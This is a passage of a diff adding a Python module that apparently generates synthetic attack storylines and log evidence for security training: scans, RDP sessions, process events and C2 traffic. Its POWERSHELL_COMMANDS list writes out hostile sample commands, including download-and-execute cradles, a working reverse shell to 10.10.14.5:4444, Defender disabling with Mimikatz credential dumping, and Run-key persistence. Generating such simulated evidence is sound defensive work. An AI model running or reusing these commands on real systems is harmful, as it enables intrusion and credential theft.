@@ -1,0 +1,4666 @@
+# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+# SPDX-License-Identifier: MIT
+
+"""Storyline event scheduling and execution methods.
+
+Contains the StorylineMixin with methods for:
+- Storyline event execution (single and batch)
+- Typed event dispatch (logon, process, connection, etc.)
+- Supplementary event emission
+- Command-line output file extraction
+- Encoded PowerShell generation
+"""
+
+import base64
+import binascii
+import itertools
+import logging
+import math
+import random
+import re
+import shlex
+import string
+from collections.abc import Iterable, Iterator, Sequence
+from datetime import UTC, datetime, timedelta
+from types import SimpleNamespace
+from typing import Any
+
+from evidenceforge.events.content_identity import FileContentIdentity
+from evidenceforge.events.lifecycle import SessionEndPlan
+from evidenceforge.events.network import SignaturePredicate
+from evidenceforge.generation.actions import (
+    IdsAlertActionBundle,
+    IdsAlertRequest,
+    PortScanRequest,
+    ScpReceiverFileActionBundle,
+    ScpReceiverFileRequest,
+    StagedArchiveSmbReadActionBundle,
+    StagedArchiveSmbReadRequest,
+    WebScanRequest,
+)
+from evidenceforge.generation.actions.rdp_session import (
+    RDP_EXPLICIT_END_CLOSE_GAP_MAX_MILLISECONDS,
+    rdp_action_deadline_source_tail,
+    rdp_action_deadline_transport_headroom_seconds,
+)
+from evidenceforge.generation.activity.helpers import _get_os_category
+from evidenceforge.generation.activity.http_content import (
+    apply_transfer_size_variance,
+    infer_mime_type_from_path,
+    is_stable_resource_path,
+    normalize_mime_type_for_path,
+    response_size_for_mime,
+    response_size_for_status,
+)
+from evidenceforge.generation.activity.network import _is_private_ip
+from evidenceforge.generation.engine.storyline_helpers import http as http_helpers
+from evidenceforge.generation.engine.storyline_helpers import ids as ids_helpers
+from evidenceforge.generation.engine.storyline_helpers import periodic as periodic_helpers
+from evidenceforge.generation.engine.storyline_helpers import process as process_helpers
+from evidenceforge.generation.intent_ledger import IntentSection
+from evidenceforge.generation.storage_world import CompiledStorageFile
+from evidenceforge.generation.world_model import (
+    RDP_BOOTSTRAP_MAX_LEAD_SECONDS,
+    RDP_BOOTSTRAP_MIN_LEAD_SECONDS,
+    RDP_SOURCE_PROCESS_MAX_LEAD_SECONDS,
+    RDP_SOURCE_PROCESS_MIN_LEAD_SECONDS,
+)
+from evidenceforge.models.exceptions import StateError
+from evidenceforge.models.scenario import (
+    ConnectionEventSpec,
+    EventSpacingConfig,
+    SmbClientLocation,
+    System,
+    User,
+)
+from evidenceforge.utils.rng import _get_rng, _stable_seed, stable_uuid
+from evidenceforge.utils.time import ensure_utc, parse_duration, parse_iso8601
+
+logger = logging.getLogger(__name__)
+
+# Compatibility imports; execution calls the focused helper owners directly.
+_c2_http_response_size = http_helpers._c2_http_response_size
+_deround_storyline_transfer_size = http_helpers._deround_storyline_transfer_size
+_is_c2_http_request = http_helpers._is_c2_http_request
+_is_exfil_connection_spec = http_helpers._is_exfil_connection_spec
+_is_round_transfer_size = http_helpers._is_round_transfer_size
+_size_storyline_connection = http_helpers._size_storyline_connection
+_storyline_http_response_body_len = http_helpers._storyline_http_response_body_len
+_build_ids_alert_contexts = ids_helpers._build_ids_alert_contexts
+_ids_attachment_ground_truth = ids_helpers._ids_attachment_ground_truth
+_beacon_token_scope = periodic_helpers._beacon_token_scope
+_choose_dns_tunnel_campaign_ttl = periodic_helpers._choose_dns_tunnel_campaign_ttl
+_choose_dns_tunnel_response_template = periodic_helpers._choose_dns_tunnel_response_template
+_choose_dns_tunnel_response_ttl = periodic_helpers._choose_dns_tunnel_response_ttl
+_dns_periodic_exclusive_start_fence = periodic_helpers._dns_periodic_exclusive_start_fence
+_dns_tunnel_background_txt_record = periodic_helpers._dns_tunnel_background_txt_record
+_dns_tunnel_extra_labels = periodic_helpers._dns_tunnel_extra_labels
+_entry_value = periodic_helpers._entry_value
+_iter_dns_tunnel_ticks = periodic_helpers._iter_dns_tunnel_ticks
+_iter_periodic_ticks = periodic_helpers._iter_periodic_ticks
+_range_or_value = periodic_helpers._range_or_value
+_render_beacon_template = periodic_helpers._render_beacon_template
+_render_dns_tunnel_response_template = periodic_helpers._render_dns_tunnel_response_template
+_weighted_profile_entry = periodic_helpers._weighted_profile_entry
+_IPV4_LITERAL_RE = process_helpers._IPV4_LITERAL_RE
+_LONG_RUNNING_EXES = process_helpers._LONG_RUNNING_EXES
+_LONG_RUNNING_PATTERNS = process_helpers._LONG_RUNNING_PATTERNS
+_MEDIUM_COMMANDS = process_helpers._MEDIUM_COMMANDS
+_SHORT_COMMANDS = process_helpers._SHORT_COMMANDS
+_estimate_process_lifetime = process_helpers._estimate_process_lifetime
+_extract_sc_create_service_start_type = process_helpers._extract_sc_create_service_start_type
+_extract_schtasks_option = process_helpers._extract_schtasks_option
+_linux_shell_process_command_line = process_helpers._linux_shell_process_command_line
+_normalize_storyline_process_image = process_helpers._normalize_storyline_process_image
+
+
+_MAX_EMBEDDED_COMMAND_B64_CHARS = 16_384
+_AUTHORED_EVENT_MAX_EARLY_JITTER_SECONDS = 30.0
+_AUTHORED_RDP_FRONTIER_EPSILON = timedelta(microseconds=1)
+_STORYLINE_SHELL_TEMPLATE_FORMATTER = string.Formatter()
+_POWERSHELL_WEB_CMDLET_USER_AGENT = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1"
+)
+_HTTP_USER_AGENT_OVERRIDE_PATTERNS = (
+    re.compile(
+        r"""(?ix)
+        \B-useragent
+        \s+
+        (?P<quote>['"])
+        (?P<value>[^'"]+)
+        (?P=quote)
+        """
+    ),
+    re.compile(
+        r"""(?ix)
+        user-agent
+        ["'\]\s]*
+        (?:,|=|=>)
+        \s*
+        (?P<quote>['"])
+        (?P<value>[^'"]+)
+        (?P=quote)
+        """
+    ),
+)
+
+
+_NET_USER_ADD_WITH_PASSWORD_RE = re.compile(
+    r"\bnet1?\s+user\s+(?P<username>\S+)\s+(?P<password>\S+)\s+/add\b",
+    re.IGNORECASE,
+)
+_LINUX_STORYLINE_FRICTION_MARKERS = (
+    "mysqldump",
+    "gzip ",
+    "tar ",
+    "zip ",
+    "scp ",
+    "sftp ",
+    "rsync ",
+)
+
+
+def _linux_storyline_tokens(command_line: str) -> list[str]:
+    """Return shell-like tokens for simple Linux storyline command inspection."""
+    try:
+        return shlex.split(command_line)
+    except ValueError:
+        return command_line.split()
+
+
+def _linux_local_path_args(command_line: str) -> list[str]:
+    """Extract local-looking path arguments from a Linux shell command."""
+    paths: list[str] = []
+    skip_next = False
+    for token in _linux_storyline_tokens(command_line)[1:]:
+        token = token.strip().rstrip(";,")
+        if not token:
+            continue
+        if skip_next:
+            skip_next = False
+            continue
+        if token in {">", ">>", "1>", "2>", "&>"}:
+            skip_next = True
+            continue
+        if token.startswith((">", "1>", "2>", "&>")):
+            token = token.lstrip("012&>")
+        if not token or token.startswith("-"):
+            continue
+        if "@" in token.split(":", 1)[0] and ":" in token:
+            continue
+        if token.startswith(("/", "~/", "./", "../")) or re.search(
+            r"\.(?:sql|gz|tgz|tar|zip|7z|csv|json|db|sqlite)(?:$|[.])",
+            token,
+            re.IGNORECASE,
+        ):
+            paths.append(token)
+    return paths
+
+
+def _linux_path_directory(path: str | None) -> str:
+    """Return a shell-safe parent directory for Linux path probes."""
+    if not path:
+        return "/tmp"
+    unquoted = path.strip("\"'")
+    if "/" not in unquoted:
+        return "."
+    directory = unquoted.rsplit("/", 1)[0] or "/"
+    return shlex.quote(directory)
+
+
+def _linux_mysqldump_database(command_line: str) -> str:
+    """Extract a conservative database token from a mysqldump command line."""
+    tokens = _linux_storyline_tokens(command_line)
+    for token in tokens[1:]:
+        if token in {">", ">>", "1>", "2>", "&>"}:
+            break
+        if token.startswith("-"):
+            continue
+        candidate = token.strip("\"'")
+        if re.fullmatch(r"[A-Za-z0-9_]+", candidate):
+            return candidate
+    return "mysql"
+
+
+def _storyline_shell_friction_pool(name: str) -> list[str]:
+    """Load a storyline shell-friction template pool from bash_commands.yaml."""
+    from evidenceforge.generation.activity.bash_commands import load_bash_commands
+
+    raw = load_bash_commands().get("storyline_friction", {}).get(name, [])
+    if not isinstance(raw, list):
+        return []
+    return [item for item in raw if isinstance(item, str) and item.strip()]
+
+
+def _render_storyline_shell_friction_template(
+    template: str,
+    values: dict[str, str],
+) -> str | None:
+    """Render one shell-friction template if all placeholders are known and safe.
+
+    Shell-friction templates can come from project-local configuration overlays, so
+    keep this renderer to a small literal-plus-placeholder language. Rejecting
+    Python format conversions/specifiers prevents malformed or hostile overlay
+    entries from crashing generation or requesting excessive output widths.
+    """
+    try:
+        parsed = list(_STORYLINE_SHELL_TEMPLATE_FORMATTER.parse(template))
+    except ValueError:
+        return None
+
+    rendered: list[str] = []
+    for literal_text, field_name, format_spec, conversion in parsed:
+        rendered.append(literal_text)
+        if field_name is None:
+            continue
+        if field_name not in values or conversion is not None or format_spec:
+            return None
+        rendered.append(values[field_name])
+
+    rendered_text = "".join(rendered)
+    if re.search(r"{[^{}]+}", rendered_text):
+        return None
+    rendered_text = re.sub(r"\s+", " ", rendered_text).strip()
+    return rendered_text or None
+
+
+def _linux_storyline_shell_friction_commands(
+    *,
+    username: str,
+    process_name: str,
+    command_line: str,
+    output_file: str | None,
+    rng: random.Random,
+) -> list[str]:
+    """Return small operator-prep commands around high-risk Linux storyline commands."""
+    command_l = command_line.lower()
+    process_base = process_name.rsplit("/", 1)[-1].lower()
+    if username != "root" and not any(
+        marker in command_l for marker in _LINUX_STORYLINE_FRICTION_MARKERS
+    ):
+        return []
+
+    local_paths = _linux_local_path_args(command_line)
+    primary_path = local_paths[0] if local_paths else output_file
+    path_value = shlex.quote(primary_path) if primary_path else ""
+    output_path_value = shlex.quote(output_file) if output_file else path_value
+    directory_value = _linux_path_directory(output_file or primary_path)
+    values = {
+        "database": _linux_mysqldump_database(command_line),
+        "directory": directory_value,
+        "path": path_value or output_path_value,
+        "output_path": output_path_value,
+    }
+
+    templates: list[str] = []
+    if "mysqldump" in command_l or process_base == "mysqldump":
+        common = _storyline_shell_friction_pool("common_probe")
+        if common:
+            templates.append(rng.choice(common))
+        templates.extend(_storyline_shell_friction_pool("before_database_dump"))
+    elif process_base in {"gzip", "tar", "zip", "7z"} or any(
+        marker in command_l for marker in ("gzip ", "tar ", "zip ")
+    ):
+        pool = _storyline_shell_friction_pool("before_archive_transform")
+        templates.extend(rng.sample(pool, k=min(2, len(pool))))
+    elif process_base in {"scp", "sftp", "rsync"} or any(
+        marker in command_l for marker in ("scp ", "sftp ", "rsync ")
+    ):
+        pool = _storyline_shell_friction_pool("before_file_transfer")
+        templates.extend(rng.sample(pool, k=min(2, len(pool))))
+
+    commands: list[str] = []
+    seen: set[str] = set()
+    for template in templates:
+        command = _render_storyline_shell_friction_template(template, values)
+        if command is None or command in seen:
+            continue
+        seen.add(command)
+        commands.append(command)
+    return commands
+
+
+def _process_owns_storyline_multipart_upload(
+    process: Any,
+    image: str,
+    spec: Any,
+) -> bool:
+    """Return whether one live curl process owns an authored multipart upload."""
+
+    multipart = getattr(spec, "request_multipart", None)
+    if multipart is None:
+        return False
+    if image.rsplit("\\", 1)[-1].rsplit("/", 1)[-1].casefold() not in {"curl", "curl.exe"}:
+        return False
+    command = str(getattr(process, "command_line", "") or "")
+    command_lower = command.casefold()
+    if not any(marker in command_lower for marker in (" -f ", " --form ")):
+        return False
+    target = f"{getattr(spec, 'hostname', '') or getattr(spec, 'dst_ip', '')}"
+    target += str(getattr(spec, "uri", "") or "/")
+    if target.casefold() not in command_lower:
+        return False
+
+    local_paths: list[str] = []
+
+    def collect(parts: Any) -> None:
+        for part in parts or ():
+            local_path = str(getattr(part, "local_source_path", "") or "")
+            if local_path:
+                local_paths.append(local_path)
+            collect(getattr(part, "parts", ()))
+
+    collect(getattr(multipart, "parts", ()))
+    return bool(local_paths) and all(path.casefold() in command_lower for path in local_paths)
+
+
+def _storyline_event_offsets(
+    num_events: int,
+    rng: random.Random,
+    spacing: EventSpacingConfig | None,
+) -> list[float]:
+    """Return child-event offsets for one storyline/red-herring step."""
+    from evidenceforge.utils.timing import typing_cadence
+
+    if not isinstance(spacing, EventSpacingConfig) or spacing.mode == "human":
+        return typing_cadence(num_events, rng)
+    if num_events <= 0:
+        return []
+    if spacing.mode == "automated":
+        min_delay = parse_duration(spacing.min_delay or "50ms").total_seconds()
+        max_delay = parse_duration(spacing.max_delay or "2s").total_seconds()
+        offsets = [0.0]
+        elapsed = 0.0
+        for _ in range(1, num_events):
+            elapsed += rng.uniform(min_delay, max_delay)
+            offsets.append(elapsed)
+        return offsets
+    if spacing.mode == "interval":
+        interval = parse_duration(spacing.interval or "1s").total_seconds()
+        offsets = []
+        last_offset = 0.0
+        for index in range(num_events):
+            nominal = interval * index
+            jitter_offset = (
+                rng.uniform(-spacing.jitter * interval, spacing.jitter * interval)
+                if index > 0 and spacing.jitter > 0.0
+                else 0.0
+            )
+            offset = max(0.0, nominal + jitter_offset)
+            if index > 0 and offset <= last_offset:
+                offset = last_offset + 0.001
+            offsets.append(offset)
+            last_offset = offset
+        return offsets
+    if len(spacing.offsets) != num_events:
+        raise ValueError(
+            "event_spacing explicit_offsets must provide exactly one offset per child event"
+        )
+    offsets = [parse_duration(offset).total_seconds() for offset in spacing.offsets]
+    if offsets != sorted(offsets):
+        raise ValueError("event_spacing explicit_offsets must be monotonic")
+    return offsets
+
+
+def _storyline_session_required_until(
+    event_time: datetime,
+    cadence_offsets: Sequence[float],
+    event_index: int,
+    future_specs: Sequence[Any] = (),
+) -> datetime | None:
+    """Return the derived lifecycle horizon for an authored remote session."""
+
+    if not cadence_offsets or event_index >= len(cadence_offsets) - 1:
+        return None
+    remaining_seconds = max(0.0, cadence_offsets[-1] - cadence_offsets[event_index])
+    process_tail_seconds = 0.0
+    for future_spec in future_specs:
+        if getattr(future_spec, "type", "") != "process":
+            continue
+        process_name = str(getattr(future_spec, "process_name", "") or "")
+        command_line = str(getattr(future_spec, "command_line", "") or process_name)
+        lifetime = process_helpers._estimate_process_lifetime(process_name, command_line)
+        if lifetime is not None:
+            # Same-shell child execution is serialized. Its maximum modeled
+            # lifetime contributes to when later authored children may start.
+            process_tail_seconds += lifetime[1] + 2.0
+    return event_time + timedelta(seconds=remaining_seconds + process_tail_seconds)
+
+
+def _effective_rate_interval(rate: float, count: int | None, rng) -> float:
+    """Return interval for rate-based bulk events.
+
+    Explicit count-based events stay exact. Duration/end-time based events treat
+    rate as an average throughput and apply deterministic per-campaign drift so
+    repeated scans with the same nominal rate do not produce identical counts.
+    """
+    if not math.isfinite(rate) or rate <= 0.0:
+        raise ValueError(f"rate must be a positive finite number, got {rate!r}")
+    effective_rate = rate
+    if count is None:
+        effective_rate *= rng.uniform(0.82, 1.18)
+    return 1.0 / effective_rate
+
+
+def _web_scan_connection_profile(rng, *, is_tls: bool = False) -> tuple[str, float, int, int]:
+    """Return source-native connection outcome fields for one web-scan attempt."""
+    conn_state = rng.choices(
+        ["SF", "S0", "RSTO", "RSTR"],
+        weights=[88, 4, 5, 3],
+        k=1,
+    )[0]
+    if conn_state == "S0":
+        return conn_state, rng.uniform(0.002, 0.08), rng.randint(44, 220), 0
+    if conn_state in {"RSTO", "RSTR"}:
+        return conn_state, rng.uniform(0.01, 0.3), rng.randint(80, 900), rng.randint(0, 400)
+    if is_tls:
+        if rng.random() < 0.72:
+            duration = rng.uniform(0.8, 3.5)
+        elif rng.random() < 0.92:
+            duration = min(rng.lognormvariate(1.0, 0.75), 12.0)
+        else:
+            duration = rng.uniform(6.0, 18.0)
+        return conn_state, duration, rng.randint(260, 2600), rng.randint(700, 12000)
+    return conn_state, rng.uniform(0.01, 0.5), rng.randint(200, 2000), rng.randint(200, 5000)
+
+
+_SCAN_PORT_SERVICES = {
+    22: "ssh",
+    53: "dns",
+    80: "http",
+    443: "ssl",
+    445: "smb",
+    3306: "mysql",
+    3389: "rdp",
+    5432: "postgresql",
+    8080: "http",
+}
+_SCAN_SERVICE_ALIASES = {
+    22: {"ssh", "sshd", "openssh"},
+    53: {"dns", "bind", "named", "ad-ds"},
+    80: {"http", "apache", "apache2", "nginx", "httpd", "iis", "gunicorn"},
+    443: {"https", "ssl", "tls", "apache", "apache2", "nginx", "httpd", "iis"},
+    445: {"smb", "samba", "lanmanserver", "ad-ds"},
+    3306: {"mysql", "mariadb"},
+    3389: {"rdp", "termservice", "terminal-services"},
+    5432: {"postgres", "postgresql"},
+    8080: {"http", "apache", "apache2", "nginx", "httpd", "gunicorn", "tomcat", "squid"},
+}
+
+
+def _inventory_token(value: str) -> str:
+    """Normalize scenario inventory labels for lightweight matching."""
+    return value.lower().replace(" ", "-").replace("_", "-")
+
+
+def _scan_target_exposes_port(
+    target_system: System | None,
+    port: int,
+    *,
+    external: bool = False,
+) -> bool:
+    """Return whether target inventory suggests a scan should find an open port."""
+    if target_system is None:
+        return False
+    if external and port not in {80, 443, 8080}:
+        return False
+    services = {_inventory_token(service) for service in target_system.services}
+    roles = {_inventory_token(role) for role in target_system.roles}
+    system_type = _inventory_token(target_system.type)
+    if services & _SCAN_SERVICE_ALIASES.get(port, set()):
+        return True
+    if port in {80, 443, 8080} and roles & {"web-server", "app-server", "forward-proxy"}:
+        return True
+    if port == 445 and (system_type == "domain-controller" or "file-server" in roles):
+        return True
+    if port == 3306 and "database" in roles:
+        return True
+    if port == 53 and "dns-server" in roles:
+        return True
+    if port == 3389 and "windows" in target_system.os.lower() and not external:
+        return True
+    return False
+
+
+def _iter_shuffled_port_scan_pairs(
+    targets: Sequence[str],
+    ports: Sequence[int],
+    rng: random.Random,
+) -> Iterator[tuple[str, int]]:
+    """Yield each target/port probe once in deterministic pseudo-shuffled order.
+
+    Port-scan scenarios can legitimately describe thousands of targets and
+    thousands of ports. Building and shuffling the full Cartesian product would
+    allocate one tuple per probe up front, so this uses an affine permutation of
+    the flattened index space instead. Memory stays proportional to the already
+    resolved target and port lists while preserving a randomized probe order.
+    """
+    target_count = len(targets)
+    port_count = len(ports)
+    total_pairs = target_count * port_count
+    if total_pairs == 0:
+        return
+
+    offset = rng.randrange(total_pairs)
+    step = 1
+    if total_pairs > 1:
+        step = rng.randrange(1, total_pairs)
+        if math.gcd(step, total_pairs) != 1:
+            for delta in range(1, 1025):
+                candidate = (step + delta) % total_pairs or 1
+                if math.gcd(candidate, total_pairs) == 1:
+                    step = candidate
+                    break
+            else:
+                step = 1
+
+    for sequence_index in range(total_pairs):
+        probe_index = (offset + sequence_index * step) % total_pairs
+        target_index, port_index = divmod(probe_index, port_count)
+        yield targets[target_index], ports[port_index]
+
+
+def _sample_network_hosts(
+    network: Any,
+    count: int,
+    rng: random.Random,
+) -> list[str]:
+    """Sample host addresses in O(requested targets) for IPv4 or enormous IPv6 networks."""
+
+    import ipaddress
+    import sys
+
+    if network.version == 4:
+        edge_reserve = 2 if network.prefixlen < 31 else 0
+        first_address = int(network.network_address) + (1 if edge_reserve else 0)
+    else:
+        edge_reserve = 1 if network.prefixlen < 127 else 0
+        first_address = int(network.network_address) + edge_reserve
+    population_size = max(0, int(network.num_addresses) - edge_reserve)
+    sample_size = min(max(0, count), population_size)
+    if population_size <= sys.maxsize:
+        offsets = rng.sample(range(population_size), sample_size)
+    else:
+        offsets = []
+        seen_offsets: set[int] = set()
+        while len(offsets) < sample_size:
+            offset = rng.randrange(population_size)
+            if offset not in seen_offsets:
+                seen_offsets.add(offset)
+                offsets.append(offset)
+    return [str(ipaddress.ip_address(first_address + offset)) for offset in offsets]
+
+
+def _port_scan_connection_profile(
+    rng,
+    *,
+    port: int,
+    target_system: System | None,
+    external: bool,
+    default_deny_state: str,
+) -> tuple[bool, str | None, str, float, int, int]:
+    """Return firewall/action and conn fields for one storyline port-scan probe."""
+    if _scan_target_exposes_port(target_system, port, external=external) and rng.random() > 0.14:
+        conn_state = rng.choices(["SF", "RSTO", "RSTR"], weights=[78, 12, 10], k=1)[0]
+        service = _SCAN_PORT_SERVICES.get(port, "")
+        if conn_state == "SF":
+            return (
+                False,
+                conn_state,
+                service,
+                rng.uniform(0.04, 0.95),
+                rng.randint(0, 160),
+                rng.randint(0, 900),
+            )
+        return (
+            False,
+            conn_state,
+            service,
+            rng.uniform(0.01, 0.35),
+            rng.randint(0, 120),
+            rng.randint(0, 240),
+        )
+
+    if default_deny_state == "REJ":
+        conn_state = rng.choices(["REJ", "S0"], weights=[72, 28], k=1)[0]
+    else:
+        conn_state = rng.choices(["S0", "REJ"], weights=[72, 28], k=1)[0]
+    if conn_state == "S0":
+        return True, conn_state, "", rng.uniform(1.2, 7.0), rng.randint(0, 64), 0
+    return True, conn_state, "", rng.uniform(0.003, 0.2), rng.randint(0, 96), rng.randint(0, 80)
+
+
+def _observed_web_scan_status(path_entry: dict[str, Any], rng) -> int:
+    """Return one request's observed HTTP status with sparse scan-time drift."""
+    status = int(path_entry.get("status", 404))
+    if rng.random() >= 0.08:
+        return status
+    if status == 200:
+        return rng.choices([301, 302, 403, 404, 500], weights=[24, 16, 18, 34, 8], k=1)[0]
+    if status in {301, 302}:
+        return rng.choice([200, 403, 404])
+    if status == 403:
+        return rng.choices([401, 404, 429, 500], weights=[18, 58, 18, 6], k=1)[0]
+    if status == 404:
+        return rng.choices([403, 429, 500], weights=[72, 20, 8], k=1)[0]
+    return status
+
+
+def _web_scan_uri_with_runtime_variation(uri: str, request_count: int, rng) -> str:
+    """Return scanner URI with sparse per-request query noise."""
+    if "?" in uri or rng.random() >= 0.24:
+        return uri
+    separator = "&" if "?" in uri else "?"
+    if rng.random() < 0.34:
+        param = rng.choice(("v", "_", "cache", "rnd"))
+        value = rng.randbytes(rng.randint(2, 5)).hex()
+    elif rng.random() < 0.68:
+        param = rng.choice(("id", "page", "item", "debug"))
+        value = str((request_count * rng.randint(3, 17) + rng.randint(1, 2009)) % 10000)
+    else:
+        param = rng.choice(("return", "next", "url"))
+        value = rng.choice(("%2F", "%2Flogin", "%2Fadmin", "%2Findex.php"))
+    return f"{uri}{separator}{param}={value}"
+
+
+def _web_scan_path_allows_referrer(path_entry: dict[str, Any]) -> bool:
+    """Return whether a scanner path plausibly carries a crawl Referer."""
+    uri = str(path_entry.get("uri", ""))
+    status = int(path_entry.get("status", 404))
+    if path_entry.get("ids") or status >= 400:
+        return False
+    suspicious_prefixes = (
+        "/.",
+        "/admin",
+        "/wp-",
+        "/phpmyadmin",
+        "/server-status",
+        "/cgi-bin",
+    )
+    return not uri.lower().startswith(suspicious_prefixes)
+
+
+# Realistic decoded PowerShell commands for base64 encoding
+POWERSHELL_COMMANDS = [
+    "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')",
+    "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()",
+    "Invoke-Expression (Invoke-WebRequest -Uri 'http://10.10.14.5:8080/shell.ps1' -UseBasicParsing).Content",
+    "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
+    "Set-MpPreference -DisableRealtimeMonitoring $true; Import-Module C:\\Users\\Public\\mimikatz.ps1; Invoke-Mimikatz -DumpCreds",
+    "[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');$c=[Microsoft.VisualBasic.Interaction]::CallByName([type]'SEBr'+'owse','Nav' + 'igate',[Microsoft.VisualBasic.CallType]::Method,@('http://attacker.com/stage2'))",
+    "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory('C:\\Users\\Public\\data.zip','C:\\Users\\Public\\exfil')",
+    "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Copy-Item -Destination C:\\Users\\Public\\staging",
+    "Invoke-Command -ComputerName DC-01 -ScriptBlock { Get-ADUser -Filter * -Properties * | Export-Csv C:\\temp\\users.csv }",
+    "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value 'powershell.exe -w hidden -ep bypass -f C:\\Users\\Public\\update.ps1'",
+]
+
+
+class StorylineMixin:
+    """Mixin providing storyline event scheduling and execution methods."""
+
+    def _resolve_scenario_network_host(self, host: str, *, src_host: str = "") -> str | None:
+        """Resolve a scenario-authored host through network identities first."""
+
+        if not host or process_helpers._IPV4_LITERAL_RE.fullmatch(host):
+            return host if process_helpers._IPV4_LITERAL_RE.fullmatch(host or "") else None
+        resolver = getattr(self, "network_resolver", None)
+        if resolver is not None:
+            resolved = resolver.resolve_host(host, src_host=src_host)
+            return resolved.ip
+        from evidenceforge.generation.activity.dns_registry import resolve_domain_ip
+
+        return resolve_domain_ip(host, src_host=src_host)
+
+    def _ensure_account_sid_tracking(self) -> None:
+        """Initialize the account SID tracking dict if not already present."""
+        if not hasattr(self, "_created_account_sids"):
+            self._created_account_sids: dict[str, str] = {}
+        if not hasattr(self, "_created_account_effect_times"):
+            self._created_account_effect_times: dict[tuple[str, str], datetime] = {}
+        if not hasattr(self, "_storyline_host_available_at"):
+            self._storyline_host_available_at: dict[tuple[str, str], datetime] = {}
+
+    def _record_last_storyline_process(
+        self, system: System, pid: int, image: str, command_line: str = ""
+    ) -> None:
+        """Record the last storyline process by host for later network provenance."""
+        if not hasattr(self, "_last_storyline_process_by_system"):
+            self._last_storyline_process_by_system: dict[str, tuple[int, str]] = {}
+        self._last_storyline_process_by_system[system.hostname] = (pid, image)
+        self._last_storyline_pid = pid
+        self._last_storyline_image = image
+        self._last_storyline_system = system.hostname
+        if command_line:
+            if not hasattr(self, "_last_storyline_process_command_by_system"):
+                self._last_storyline_process_command_by_system: dict[str, tuple[int, str, str]] = {}
+            self._last_storyline_process_command_by_system[system.hostname] = (
+                pid,
+                image,
+                command_line,
+            )
+
+    def _record_storyline_process_ref(
+        self,
+        *,
+        actor: User,
+        system: System,
+        process_ref: str,
+        pid: int,
+        image: str,
+    ) -> None:
+        """Record an explicit storyline process reference for later parentage."""
+        if not hasattr(self, "_storyline_process_refs"):
+            self._storyline_process_refs: dict[tuple[str, str, str], tuple[int, str]] = {}
+        self._storyline_process_refs[(system.hostname, actor.username, process_ref)] = (pid, image)
+
+    def _storyline_process_ref_for_parent(
+        self,
+        *,
+        actor: User,
+        system: System,
+        parent_ref: str | None,
+    ) -> tuple[int, str] | None:
+        """Resolve an explicit parent_ref to a known storyline process."""
+        if parent_ref is None:
+            return None
+        refs = getattr(self, "_storyline_process_refs", {})
+        key = (system.hostname, actor.username, parent_ref)
+        resolved = refs.get(key)
+        if resolved is None:
+            return None
+        pid, image = resolved
+        state_manager = getattr(self, "state_manager", None)
+        if state_manager is None:
+            activity_generator = getattr(self, "activity_generator", None)
+            state_manager = getattr(activity_generator, "state_manager", None)
+        if state_manager is None:
+            return resolved
+        process = state_manager.get_process(system.hostname, pid)
+        if process is None or process.image != image:
+            refs.pop(key, None)
+            return None
+        return resolved
+
+    def _storyline_process_ref_release_index(
+        self,
+        *,
+        actor: User,
+        system: System,
+        process_ref: str,
+    ) -> int:
+        """Return the last storyline group that requires one named process to be live."""
+
+        target_key = (system.hostname.casefold(), actor.username.casefold(), process_ref)
+        active_ref_by_actor_system: dict[tuple[str, str], str] = {}
+        release_indices: dict[tuple[str, str, str], int] = {}
+        for event_index, storyline_event in enumerate(self.scenario.storyline):
+            actor_system = (
+                storyline_event.system.casefold(),
+                storyline_event.actor.casefold(),
+            )
+            for candidate in storyline_event.events:
+                candidate_type = getattr(candidate, "type", "")
+                if candidate_type == "process":
+                    parent_ref = getattr(candidate, "parent_ref", None)
+                    if parent_ref is not None:
+                        parent_key = (*actor_system, parent_ref)
+                        release_indices[parent_key] = max(
+                            event_index,
+                            release_indices.get(parent_key, event_index),
+                        )
+                    candidate_ref = getattr(candidate, "process_ref", None)
+                    if candidate_ref is not None:
+                        active_ref_by_actor_system[actor_system] = candidate_ref
+                        release_indices.setdefault((*actor_system, candidate_ref), event_index)
+                elif candidate_type in {"create_remote_thread", "process_access"}:
+                    active_ref = active_ref_by_actor_system.get(actor_system)
+                    if active_ref is not None:
+                        active_key = (*actor_system, active_ref)
+                        release_indices[active_key] = max(
+                            event_index,
+                            release_indices.get(active_key, event_index),
+                        )
+        return release_indices.get(target_key, 0)
+
+    def _record_storyline_service_install(
+        self,
+        system: System,
+        service_name: str,
